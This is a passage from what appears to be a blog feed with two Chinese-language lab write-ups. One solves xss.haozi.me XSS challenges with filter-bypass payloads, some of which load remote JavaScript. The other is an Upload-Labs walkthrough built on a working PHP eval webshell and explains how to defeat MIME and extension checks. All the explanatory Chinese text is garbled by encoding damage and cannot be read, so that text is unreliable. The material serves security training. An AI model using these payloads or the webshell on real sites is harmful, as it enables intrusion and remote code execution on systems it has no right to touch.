&lt;img src=&quot;&quot; onerror=alert`1`&gt;

å¯ç”¨Htmlå®ä½“ç¼–ç è¡¨ç¤ºå·¦å³æ‹¬å·
&lt;img src=&quot;&quot; onerror=alert&amp;lpar;1&amp;rpar;&gt;
&lt;img src=&quot;&quot; onerror=alert&amp;#40;1&amp;#41;&gt;
&amp;lpar;å’Œ&amp;#40;è¡¨ç¤ºå·¦æ‹¬å·(
&amp;rpar;å’Œ&amp;#41;è¡¨ç¤ºå³æ‹¬å·)

å¯ä»¥å¼•ç”¨å¤–éƒ¨jsæ–‡ä»¶
&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-04.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x04">0x04</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
</code></pre>
<p>è¿™é¢˜å’Œ0x03å¾ˆåƒ,å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼å¤šäº†ä¸ªåå¼•å·æ£€æµ‹,æ‰€ä»¥0x03çš„payloadé™¤äº†ç¬¬ä¸€æ¡,å…¶ä»–éƒ½èƒ½ç”¨</p>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-05.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x05">0x05</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.replace(/--&gt;/g, 'ğŸ˜‚')
  return '&lt;!-- ' + input + ' --&gt;'
}

å‰ç«¯ä»£ç :
&lt;!--  --&gt;
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œäº†è¿‡æ»¤,<code>--&gt;</code>è¢«æ›¿æ¢æˆğŸ˜‚,ç„¶è€Œ<code>&lt;!--</code>ä¸<code>--&gt;</code>ç»„æˆä¸€ä¸ªHTMLæ³¨é‡Š,ä½†æ˜¯HTMLè¿˜æœ‰ä¸€ç§ä¸èƒ½ä¸<code>&lt;!--</code>ç»„æˆ,å°±æ˜¯<code>--!&gt;</code>,HTMLä¼šè‡ªåŠ¨è½¬ä¸º<code>--&gt;</code></p>
<pre><code class="language-javascript">payload:
--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-06.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x06">0x06</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.replace(/auto|on.*=|&gt;/ig, '_')
  return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
}

å‰ç«¯ä»£ç :
&lt;input value=1  type=&quot;text&quot;&gt;
</code></pre>
<p>æœåŠ¡å™¨ä¾æ—§ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤,æŠŠ<code>auto</code>ã€<code>&gt;</code>ã€<code>onæ¥å¤´=ç»“å°¾</code>,æ­£åˆ™è¡¨è¾¾å¼çš„<code>i</code>æ˜¯<code>ä¸åŒºåˆ†å¤§å°å†™</code>,ä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ²¡æœ‰è¿‡æ»¤æ¢è¡Œ</p>
<pre><code class="language-javascript">payload:
onclick
=alert(1)
å•æœºæ–‡æœ¬æ¡†å³å¯è§¦å‘JavaScriptä»£ç 
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-07.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x07">0x07</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi

  input = input.replace(stripTagsRe, '')
  return `&lt;article&gt;${input}&lt;/article&gt;`
}

å‰ç«¯ä»£ç :
&lt;article&gt;&lt;/article&gt;
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼,å¯¹<code>&lt;&gt;</code>æ‹¬èµ·æ¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤æ›¿æ¢æˆç©º,ä½†æ˜¯ç”±äº<code>HTML</code>çš„å®¹é”™æ€§æé«˜,æ‰€ä»¥,å¯¹äºä¸é—­åˆä¹Ÿèƒ½æ¥å—</p>
<pre><code class="language-html">payload:
&lt;img src=&quot;&quot; onerror=alert(1)
     åé¢åŠ \\ ç©ºæ ¼ å›è½¦ æ‰èƒ½è§¦å‘
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-08.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x08">0x08</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (src) {
  src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */')
  return `
    &lt;style&gt;
      ${src}
    &lt;/style&gt;
  `
}

å‰ç«¯ä»£ç :
&lt;style&gt;
      
    &lt;/style&gt;
</code></pre>
<p>æœåŠ¡å™¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†æˆ‘ä»¬æƒ³è¦é—­åˆçš„<code>styleæ ‡ç­¾</code>,ä¸”å¿½ç•¥äº†å¤§å°å†™,ä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä»¥ä¸€ä¸ªæ•´ä½“æ¥åˆ¤æ–­,æ‰€ä»¥åœ¨styleé—­åˆæ ‡ç­¾é‡Œé¢åŠ å…¥ç©ºæ ¼,å°±èƒ½ç»•è¿‡</p>
<pre><code class="language-javascript">payload:
&lt;/style &gt;
&lt;script&gt; alert(1) &lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-09.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x09">0x09</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;`
  }
  return 'Invalid URL'
}

å‰ç«¯ä»£ç :
Invalid URL
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼é™åˆ¶äº†,å¿…é¡»ä½¿ç”¨<code>https://www.sogmentfault.com</code>å¼€å¤´,ä¸”æ”¾åœ¨<code>script</code>æ ‡ç­¾çš„<code>src</code>å±æ€§é‡Œé¢.æ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆç»•è¿‡</p>
<pre><code class="language-javascript">payload:
https://www.segmentfault.com&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;https://xss.haozi.me/j.js&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-10.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0a">0x0A</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&amp;/g, '&amp;amp;')
            .replace(/'/g, '&amp;#39;')
            .replace(/&quot;/g, '&amp;quot;')
            .replace(/&lt;/g, '&amp;lt;')
            .replace(/&gt;/g, '&amp;gt;')
            .replace(/\//g, '&amp;#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;`
  }
  return 'Invalid URL'
}

å‰ç«¯ä»£ç :
Invalid URL
</code></pre>
<p>å’Œ<code>0x09</code>ä¸€æ ·éœ€è¦åˆ¶å®šçš„Urlå¼€å¤´,ä½†æ˜¯æœ¬é¢˜è¿˜å°†&quot;&amp;ã€`ã€&quot;ã€&lt;ã€&gt;ã€&quot;è¿™äº›æ ‡ç‚¹ç¬¦å·å…¨éƒ¨è½¬æ¢æˆHTMLå®ä½“ç¼–ç .å› æ­¤æœ¬é¢˜ä¸èƒ½é€šè¿‡é—­åˆç»•è¿‡,éœ€è¦ç”¨åˆ°HTMLçš„@ç‰¹æ€§,è¯·æ±‚Url: www.google.com@www.youtube.com æœ€åè®¿é—®åˆ°æ˜¯ YouTube , Googleç›¸å½“äºåšäº†ä¸€æ¬¡è·³è½¬</p>
<pre><code class="language-javascript">payload:
https://www.segmentfault.com@xss.haozi.me/j.js
</code></pre>
<p><code>æ³¨æ„:ç”±äºChromeæµè§ˆå™¨çš„ä¸€äº›å®‰å…¨æœºåˆ¶,æ— æ³•æ­£å¸¸è¯·æ±‚è¿™ä¸ªUrl,æ‰€ä»¥è¿™é¢˜æ”¹ä¸ºä½¿ç”¨Firefoxæµè§ˆå™¨</code></p>
<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-11.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0b">0x0B</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.toUpperCase()
  return `&lt;h1&gt;${input}&lt;/h1&gt;`
}

å‰ç«¯ä»£ç :
&lt;h1&gt;&lt;/h1&gt;
</code></pre>
<p>è¿™å…³ä½¿ç”¨äº†<code>toUpperCase</code>å‡½æ•°å¯¹è¾“å…¥çš„å­—ç¬¦è¿›è¡Œå¤§å†™è½¬æ¢,HTMLæ ‡ç­¾ä¸åŒºåˆ†å¤§å°å†™,ä½†æ˜¯JavaScriptä»£ç åŒºåˆ†,ä¹Ÿå°±æ˜¯è¯´<code>ALERT</code>ä¸èƒ½æ‰§è¡Œ.ä½†æ˜¯å¯ä»¥å°†JavaScriptä»£ç è¿›è¡Œ<code>uniocde</code>ç¼–ç è¿›è¡Œç»•è¿‡</p>
<p><code>æ³¨æ„Unicodeç¼–ç æœ‰ä¸¤ç§ç»“æœ,ä¸€ä¸ªæ˜¯ä¸­æ–‡è½¬Unicodeç»“æœæ˜¯\uå¼€å¤´çš„,å¦ä¸€ä¸ªæ˜¯ASCIIè½¬Unicodeç»“æœæ˜¯&amp;#å¼€å¤´çš„.è¿™é‡Œç”¨ASCIIè½¬Unicode</code></p>
<pre><code class="language-html">payload:
&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-12.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0c">0x0C</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
}

å‰ç«¯ä»£ç :
&lt;h1&gt;&lt;/h1&gt;
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†<code>script</code>æ›¿æ¢æˆç©º,ä¸”å¯¹è¾“å…¥çš„å­—ç¬¦è¿›è¡Œå¤§å†™è½¬æ¢,ä½¿ç”¨<code>0x0B</code>çš„payloadå³å¯,ä¸è¦ç›¸ä¿¡ç½‘ä¸Šç”¨å¤–éƒ¨å¼•å…¥<code>j.js</code>,å› ä¸ºè½¬ä¸ºå¤§å†™ä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶</p>
<pre><code class="language-html">payload:
&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-13.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0d">0x0D</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.replace(/[&lt;/&quot;']/g, '')
  return `
    &lt;script&gt;
          // alert('${input}')
    &lt;/script&gt;
  `
}

å‰ç«¯ä»£ç :
&lt;script&gt;
          // alert('')
    &lt;/script&gt;
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹ <code>&lt; / &quot; '</code>è¿›è¡Œè¿‡æ»¤æ›¿æ¢æˆç©º,ä¸”åœ¨è¾“å…¥çš„åœ°æ–¹è¿›è¡Œå•è¡Œæ³¨é‡Š,å› ä¸ºæ˜¯å•è¡Œæ³¨é‡Šæ‰€ä»¥æ¢è¡Œå°±èƒ½ç»•è¿‡,ä½†æ˜¯ç”±äºåé¢æ¥ç€<code>')</code>,æ‰€ä»¥å¿…é¡»å±è”½æˆ–é—­åˆæ‰èƒ½æ‰§è¡ŒJavaScriptä»£ç ,æ ¹æ®æœåŠ¡å™¨ç«¯ä»£ç ,åªèƒ½ä½¿ç”¨ <code>--&gt;</code>æ¥è¿›è¡Œæ³¨é‡Š</p>
<pre><code class="language-javascript">payload:(æ³¨æ„æœ‰ä¸€è¡Œç©ºè¡Œ)

alert(1)
--&gt;
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-14.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0eå·¨å‘">0x0E(å·¨å‘!!!)</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
  input = input.toUpperCase()
  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
}

å‰ç«¯ä»£ç :
&lt;h1&gt;&lt;/h1&gt;
</code></pre>
<p>æœåŠ¡å™¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹ä»¥<code>&lt;</code>å¼€å¤´åé¢æ¥å¤§å°å†™å­—æ¯è¿›è¡Œæ›¿æ¢æˆ<code>&lt;_</code>åŠ å¤§å†™å­—æ¯,å¯¼è‡´æ— æ³•ä½¿ç”¨<code>script</code>æ ‡ç­¾,ä¸”å¤§å†™çš„JavaScriptä»£ç æ— æ³•æ‰§è¡Œ,æ²¡æœ‰ä¸æ¯«å¤´ç»ª,ç¿»äº†ä¸‹å®˜æ–¹WP,äº†è§£åˆ°ä¸€äº›éªšçŸ¥è¯†</p>
<p><code>Å¿</code>æ˜¯å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„<code>S</code></p>
<p><code>è¿™ä¹Ÿå¤ªéªšäº†å§!!!,ç©CTFå—???è„‘æ´è¿™ä¹ˆå¤§</code></p>
<p><code>åˆæ˜¯ä¸€ä¸ªå‘!!!,å®˜æ–¹WPæ˜¯å¼•å…¥j.js ç”±äºå¤§å†™è½¬æ¢åå˜æˆJ.JS.æ–‡ä»¶ä¸å­˜åœ¨è®¿é—®404.åªèƒ½å»è‡ªå·±çš„æœåŠ¡å™¨å†™è„šæœ¬å¼•å…¥è‡ªå·±çš„jsæ–‡ä»¶</code></p>
<pre><code class="language-javascript">payload:
&lt;Å¿cript src=&quot;http://è‡ªå·±çš„æœåŠ¡å™¨/ALERT.JS&quot;&gt;&lt;/script&gt;

ALERT.JS:
alert(1)
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-15.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x0f">0x0F</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&amp;/g, '&amp;amp;')
            .replace(/'/g, '&amp;#39;')
            .replace(/&quot;/g, '&amp;quot;')
            .replace(/&lt;/g, '&amp;lt;')
            .replace(/&gt;/g, '&amp;gt;')
            .replace(/\//g, '&amp;#x2f;')
  }
  return `&lt;img src onerror=&quot;console.error('${escapeHtml(input)}')&quot;&gt;`
}

å‰ç«¯ä»£ç :
&lt;img src onerror=&quot;console.error('')&quot;&gt;
</code></pre>
<p>æœåŠ¡å™¨å¯¹<code>&amp; ' &quot; &lt; &gt; \</code>è¿›è¡ŒHTMLå®ä½“ç¼–ç ,ä½†æ˜¯åœ¨HTMLæ ‡ç­¾é‡Œé¢ä½¿ç”¨HTMLå®ä½“ç¼–ç æ²¡å•¥ç”¨,å› ä¸ºæµè§ˆå™¨ä¼šè§£æHTMLå®ä½“ç¼–ç ,æ‰€ä»¥å°†<code>onerrorçš„console.erroré—­åˆ</code>ç»•è¿‡å°±è¡Œäº†</p>
<pre><code class="language-javascript">payload:
')alert('1
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-16.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x10">0x10</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  return `
&lt;script&gt;
  window.data = ${input}
&lt;/script&gt;
  `
}

å‰ç«¯ä»£ç :
&lt;script&gt;
  window.data = 
&lt;/script&gt;
</code></pre>
<p>é€åˆ†é¢˜???æ²¡æœ‰ä»»ä½•è¿‡æ»¤,èƒ½ç›´æ¥æ‰§è¡Œalert(1)</p>
<pre><code class="language-javascript">payload:
alert(1)
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-17.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x11">0x11</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/&quot;/g, '\\&quot;')
            .replace(/`/g, '\\`')
            .replace(/&lt;/g, '\\74')
            .replace(/&gt;/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
&lt;script&gt;
  var url = 'javascript:console.log(&quot;${s}&quot;)'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script&gt;
`
}

å‰ç«¯ä»£ç :
&lt;script&gt;
  var url = 'javascript:console.log(&quot;&quot;)'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script&gt;
</code></pre>
<p>æœåŠ¡å™¨è¿‡æ»¤äº†ä¸€å¤§å †å­—ç¬¦,å¹¶åœ¨å…¶å‰é¢æ·»åŠ åæ–œæ è¿›è¡Œè½¬ä¹‰</p>
<p>æ³¨æ„<code>console.log(&quot;${s}&quot;)</code>,å½“æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåŒå¼•å·<code>&quot;</code>,æ­£åˆ™ä¼šå˜æˆ<code>\&quot;</code>,ç„¶åæ•´æ¡è¯­å¥å˜æˆ<code>console.log(&quot;\&quot;&quot;)</code>.è¿™æ ·åæ–œæ å°±å¤±å»è½¬ä¹‰çš„ä½œç”¨</p>
<pre><code class="language-javascript">payload:
&quot;);alert(&quot;1
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-18.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x12">0x12</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
// from alf.nu
function escape (s) {
  s = s.replace(/&quot;/g, '\\&quot;')
  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;'
}

å‰ç«¯ä»£ç :
&lt;script&gt;console.log(&quot;&quot;);&lt;/script&gt;
</code></pre>
<p>æœåŠ¡å™¨å¯¹åŒå¼•å·è¿›è¡Œè¿‡æ»¤,è½¬ä¸º<code>\\&quot;</code>,æŠŠåŒå¼•å·å’Œæ‹¬å·è¿›è¡Œè¡¥å…¨å°±èƒ½ç»•è¿‡</p>
<pre><code class="language-javascript">payload:
\&quot;);alert(1)//
</code></pre>
<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-19.png" alt="" loading="lazy"></figure>
<br>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“ : Upload-Labsé€šå…³æ‰‹å†Œ]]></title>
        <id>https://M0kY4n.github.io/Websec/post/upload-labs-tong-guan-shou-ce/</id>
        <link href="https://M0kY4n.github.io/Websec/post/upload-labs-tong-guan-shou-ce/">
        </link>
        <updated>2020-07-22T13:41:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="upload-labsé€šå…³æ‰‹å†Œ">Upload-Labsé€šå…³æ‰‹å†Œ</h1>
<br>
<h2 id="é¶æœºç¯å¢ƒ">é¶æœºç¯å¢ƒ</h2>
<table>
<thead>
<tr>
<th>æµè§ˆå™¨</th>
<th>Chrome</th>
</tr>
</thead>
<tbody>
<tr>
<td>è¿æ¥webshellå·¥å…·</td>
<td>AntSword</td>
</tr>
<tr>
<td>æŠ“åŒ…å·¥å…·</td>
<td>Burpsuite Pro</td>
</tr>
<tr>
<td>è·¯ç”±å™¨ä»£ç†æ’ä»¶</td>
<td>Proxy SwitchyOmega</td>
</tr>
</tbody>
</table>
<pre><code class="language-php">#webshellä»£ç 

&lt;?php
    @eval($_REQUEST[&quot;shell&quot;]);
?&gt;
</code></pre>
<br>
<h2 id="upload-labsé¢˜å‹æ€»ç»“">Upload-Labsé¢˜å‹æ€»ç»“</h2>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/upload-labs%E9%A2%98%E5%9E%8B.png" alt="" loading="lazy"></figure>
<h2 id="pass-01">Pass-01</h2>
<blockquote>
<p>æœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼</p>
</blockquote>
<pre><code class="language-javascript">//JavaScriptä»£ç 
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == &quot;&quot;) {
        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);
        return false;
    }
    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
    var allow_ext = &quot;.jpg|.png|.gif&quot;;
    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
        var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;
        alert(errMsg);
        return false;
    }
}
</code></pre>
<h3 id="ç¦ç”¨javascript">ç¦ç”¨JavaScript</h3>
<p>åœ¨ç½‘ç«™è®¾ç½®é‡Œç¦æ­¢JavaScriptè¿è¡Œ</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E7%A6%81%E7%94%A8JavaScript.png" alt="" loading="lazy"></figure>
<h3 id="ä¿®æ”¹javascriptä»£ç ">ä¿®æ”¹JavaScriptä»£ç </h3>
<p>åœ¨Consoleä¸­ä¿®æ”¹JavaScriptä»£ç å¹¶æ‰§è¡Œå³å¯,æ–¹æ³•å¾ˆå¤š,åªè¦ç»•è¿‡åˆ¤æ–­å°±è¡Œ,æˆ‘æ˜¯å°†åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ çš„&quot;-1&quot;æ”¹ä¸º&quot;0&quot;</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E4%BF%AE%E6%94%B9JavaScript%E4%BB%A3%E7%A0%81.png" alt="" loading="lazy"></figure>
<h3 id="è§£æä¸Šä¼ çš„webshell">è§£æä¸Šä¼ çš„WebShell</h3>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="" loading="lazy"></figure>
<p>ä¹‹åè¿æ¥WebShelléƒ½æ˜¯è¿™ä¸ªæ“ä½œ,åé¢å°±ä¸æ¼”ç¤ºäº†</p>
<br>
<h2 id="pass-02">Pass-02</h2>
<blockquote>
<p>æœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<blockquote>
<p>MIMEç§‘æ™®:https://baike.baidu.com/item/MIME/2900607?fr=aladdin#4</p>
</blockquote>
<h3 id="è®¾ç½®burpä»£ç†">è®¾ç½®burpä»£ç†</h3>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%AE%BE%E7%BD%AEburp%E4%BB%A3%E7%90%86.png" alt="" loading="lazy"></figure>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<p>æ ¹æ®é¢˜ç›®æç¤º,ä¿®æ”¹æ•°æ®åŒ…çš„Content-Type,ç¬¦åˆJavaScriptä»£ç å³å¯</p>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-02%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-03">Pass-03</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="é»‘åå•ç»•è¿‡">é»‘åå•ç»•è¿‡</h3>
<p>ä½¿ç”¨ .php3 .php4 .php5.phtml è¿™äº›åç¼€çš„WebShellä¸Šä¼ è§£æ</p>
<p>å‰ææ˜¯Apacheçš„httpd-confé…ç½®æ–‡ä»¶å¿…é¡»æœ‰</p>
<pre><code>AddType application/x-httpd-php .php .phtml .php3 .php4 .php5
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-03%E8%BF%9E%E6%8E%A5webshell.png" alt="" loading="lazy"></figure>
<br>
